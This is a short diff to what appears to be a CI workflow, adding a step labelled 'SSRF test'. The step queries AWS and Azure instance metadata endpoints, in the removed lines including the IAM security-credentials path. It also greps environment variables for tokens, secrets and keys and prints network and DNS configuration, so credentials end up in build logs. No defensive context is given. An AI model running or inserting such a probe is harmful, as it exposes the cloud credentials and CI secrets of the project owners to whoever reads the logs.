@@ -6,7 +6,12 @@ jobs:
     steps:
       - name: SSRF test
         run: |
-          curl -s http://169.254.169.254/latest/meta-data/
-          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-          curl -s -H "X-aws-ec2-metadata-token: test" http://169.254.169.254/latest/meta-data/iam/security-credentials/
-          env | grep -i "AWS\|AZURE\|TOKEN\|SECRET\|KEY" || true
+          echo "=== AWS METADATA ==="
+          curl -sv http://169.254.169.254/latest/meta-data/ 2>&1 || echo "BLOCKED"
+          echo "=== AZURE METADATA ==="
+          curl -sv -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 || echo "BLOCKED"
+          echo "=== ENV VARS ==="
+          env | grep -i "AWS\|AZURE\|TOKEN\|SECRET\|KEY\|ACTIONS" || echo "NONE FOUND"
+          echo "=== NETWORK ==="
+          ip route || true
+          cat /etc/resolv.conf || true
